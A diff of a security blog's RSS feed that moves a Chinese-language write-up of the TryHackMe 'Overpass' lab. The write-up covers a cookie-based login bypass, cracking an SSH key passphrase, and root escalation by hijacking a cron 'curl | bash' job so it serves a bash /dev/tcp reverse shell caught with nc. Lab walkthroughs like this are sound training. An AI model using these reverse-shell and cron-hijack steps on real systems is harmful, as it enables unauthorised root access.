@@ -8,12 +8,12 @@
         <pubDate>Sat, 30 Mar 2024 20:55:06 +0800</pubDate>
         <lastBuildDate>Sat, 30 Mar 2024 20:55:06 +0800</lastBuildDate>
         <category>ctfmisc</category>
-        <category>小小简单靶场</category>
         <category>wp集合</category>
+        <category>小小简单靶场</category>
         <category>ctfweb</category>
+        <category>sql学习</category>
         <category>linux提权</category>
         <category>tryhackme</category>
-        <category>sql学习</category>
         <category>windows</category>
         <item>
             <guid isPermalink="true">https://k1t0111.github.io/2024/03/30/ctf-misc-%E6%8E%8C%E6%8E%A7%E8%85%BE%E9%BE%99%E6%9D%AF%E5%88%B7%E9%A2%98/</guid>
@@ -862,6 +862,81 @@ jau:9&lt;br /&gt;
  ]]></description>
         </item>
         <item>
+            <guid isPermalink="true">https://k1t0111.github.io/2024/02/01/tryhackme-overpass-wp/</guid>
+            <title>Tryhackme-Overpass-wp</title>
+            <link>https://k1t0111.github.io/2024/02/01/tryhackme-overpass-wp/</link>
+            <category>linux提权</category>
+            <category>tryhackme</category>
+            <pubDate>Thu, 01 Feb 2024 09:49:48 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;ul class=&#34;toc&#34;&gt;
+&lt;li&gt;&lt;a href=&#34;#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B&#34;&gt;主机信息探测&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#web%E6%9E%9A%E4%B8%BE&#34;&gt;web枚举&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81cookie%E6%9B%B4%E6%94%B9&#34;&gt;身份验证cookie更改&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#ssh%E8%BF%9E%E6%8E%A5&#34;&gt;ssh连接&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87&#34;&gt;权限提升&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%80%9D%E8%B7%AF&#34;&gt;思路&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%80%BB%E7%BB%93&#34;&gt;总结&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;Tryhackme-Overpass-wp&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;hello 大家今天是一波 thm 的 overpass 靶场的 wp&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;主机信息探测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#主机信息探测&#34;&gt;#&lt;/a&gt; 主机信息探测&lt;/h1&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/02/01/MQwmwDJP.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;从 80 端口找 web 漏洞或者 ssh 爆破，但是 ssh 爆破难度太大，先看 web&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;web枚举&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web枚举&#34;&gt;#&lt;/a&gt; web 枚举&lt;/h1&gt;
+&lt;blockquote&gt;&lt;/blockquote&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/02/01/3TYWDkvN.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;找到 admin 目录  可能有身份验证损坏让我们登陆到后台&lt;br /&gt;
+之后根据提示不用暴力破解 则看到了 login.js&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;身份验证cookie更改&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#身份验证cookie更改&#34;&gt;#&lt;/a&gt; 身份验证 cookie 更改&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;login.js&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;login&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; usernameBox &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;#username&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; passwordBox &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;#password&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; loginStatus &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;#loginStatus&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    loginStatus&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;textContent &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; creds &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token literal-property property&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; usernameBox&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token literal-property property&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; passwordBox&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;postData&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/api/login&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; creds&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; statusOrCookie &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;await&lt;/span&gt; response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;statusOrCookie &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Incorrect credentials&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        loginStatus&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;textContent &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Incorrect Credentials&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        passwordBox&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        Cookies&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;SessionToken&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;statusOrCookie&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;location &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;/admin&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;两种方法绕过:&lt;br /&gt;
+&lt;strong&gt; 方法一:&lt;/strong&gt; 代码审计发现如果登录返回不是 Incorrect credentials 则设置 cookie&lt;br /&gt;
+ 我们可以控制 bp 抓登陆的响应包将包的 Incorrect credentials 修改并且设置 302 响应 &amp;gt; 头 loaction:/admin&lt;br /&gt;
+&lt;strong&gt; 方法二:&lt;/strong&gt; 直接在控制台修改 document.cookie=&amp;quot;SessionToken&amp;quot;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;ssh连接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssh连接&#34;&gt;#&lt;/a&gt; ssh 连接&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;在 /admin 找到 ssh 私钥，将私钥保存位 rsa, 但是要找到私钥的密码可以利用 ssh2john 和 john 破解密码&lt;br /&gt;
+最后找到私钥密码 james13&lt;br /&gt;
+ 直接利用 ssh 登陆&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/02/01/NctBPrVj.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+获取 user 的 flag&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限提升&#34;&gt;#&lt;/a&gt; 权限提升&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;可以看到 todo.txt 有提示在 /etc/crontab 中发现有 root 权限的脚本&lt;br /&gt;
+ root curl overpass.thm/downloads/src/buildscript.sh | bash&lt;br /&gt;
+ 并且 /etc/hosts 我们可以修改此时就想到我们可以 利用 root 的 cronjob 来进行一个反弹 shell&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;思路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#思路&#34;&gt;#&lt;/a&gt; 思路&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;将 /etc/hosts 的 overpass.thm 对应的 ip 修改为本机的 ip&lt;br /&gt;
+ 本机开 http 服务  python -m http.server 80&lt;br /&gt;
+&lt;strong&gt;Ps:&lt;/strong&gt;&lt;br /&gt;
+ 注意本机的网站目录必须是 downloads/src/buildscript.sh&lt;br /&gt;
+&lt;a href=&#34;http://xn--buildscript-ft8qz71o.sh&#34;&gt; 并且 buildscript.sh&lt;/a&gt; 应该修改为 bash -i &amp;gt;&amp;amp; /dev/tcp/ 本机 ip / 本机端口 0&amp;gt;&amp;amp;!&lt;br /&gt;
+ 最后在本机中开启 nc -lvp  本机端口开启监听等几秒就会有 root 的 shell 连接&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;overpass1 还是比较简单的主要还是要掌握一些基本的提权方法以及 web 登陆的相关机制的知识&lt;/p&gt;
+&lt;/blockquote&gt;
+ ]]></description>
+        </item>
+        <item>
             <guid isPermalink="true">https://k1t0111.github.io/2024/02/01/vulnhub-vegeta%E9%9D%B6%E5%9C%BAwp/</guid>
             <title>vulnhub-vegeta靶场wp</title>
             <link>https://k1t0111.github.io/2024/02/01/vulnhub-vegeta%E9%9D%B6%E5%9C%BAwp/</link>
@@ -968,81 +1043,6 @@ misc 杂项隐写 音频直接&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;本次 vulhub 靶场的 vegeta 靶机相对来说还是比较简单的，其实还是很有 ctf 的风格的，主要就是一个 web 的脑洞寻找细节以及 misc 题目的音频隐写的学习，&lt;br /&gt;
  最后就是 ssh 简单连接和 passwd 提权，对于新手还是很推荐来练练手的&lt;/p&gt;
-&lt;/blockquote&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://k1t0111.github.io/2024/02/01/tryhackme-overpass-wp/</guid>
-            <title>Tryhackme-Overpass-wp</title>
-            <link>https://k1t0111.github.io/2024/02/01/tryhackme-overpass-wp/</link>
-            <category>linux提权</category>
-            <category>tryhackme</category>
-            <pubDate>Thu, 01 Feb 2024 09:49:48 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;&lt;ul class=&#34;toc&#34;&gt;
-&lt;li&gt;&lt;a href=&#34;#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B&#34;&gt;主机信息探测&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#web%E6%9E%9A%E4%B8%BE&#34;&gt;web枚举&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81cookie%E6%9B%B4%E6%94%B9&#34;&gt;身份验证cookie更改&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#ssh%E8%BF%9E%E6%8E%A5&#34;&gt;ssh连接&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87&#34;&gt;权限提升&lt;/a&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;#%E6%80%9D%E8%B7%AF&#34;&gt;思路&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#%E6%80%BB%E7%BB%93&#34;&gt;总结&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;Tryhackme-Overpass-wp&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;hello 大家今天是一波 thm 的 overpass 靶场的 wp&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h1 id=&#34;主机信息探测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#主机信息探测&#34;&gt;#&lt;/a&gt; 主机信息探测&lt;/h1&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/02/01/MQwmwDJP.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;从 80 端口找 web 漏洞或者 ssh 爆破，但是 ssh 爆破难度太大，先看 web&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h1 id=&#34;web枚举&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web枚举&#34;&gt;#&lt;/a&gt; web 枚举&lt;/h1&gt;
-&lt;blockquote&gt;&lt;/blockquote&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/02/01/3TYWDkvN.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;找到 admin 目录  可能有身份验证损坏让我们登陆到后台&lt;br /&gt;
-之后根据提示不用暴力破解 则看到了 login.js&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h1 id=&#34;身份验证cookie更改&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#身份验证cookie更改&#34;&gt;#&lt;/a&gt; 身份验证 cookie 更改&lt;/h1&gt;
-&lt;blockquote&gt;
-&lt;p&gt;login.js&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;login&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; usernameBox &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;#username&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; passwordBox &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;#password&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; loginStatus &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;#loginStatus&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    loginStatus&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;textContent &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; creds &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token literal-property property&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; usernameBox&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token literal-property property&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; passwordBox&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;postData&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/api/login&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; creds&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; statusOrCookie &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;await&lt;/span&gt; response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;statusOrCookie &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Incorrect credentials&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        loginStatus&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;textContent &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Incorrect Credentials&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        passwordBox&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        Cookies&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;SessionToken&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;statusOrCookie&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;location &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;/admin&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
-&lt;p&gt;两种方法绕过:&lt;br /&gt;
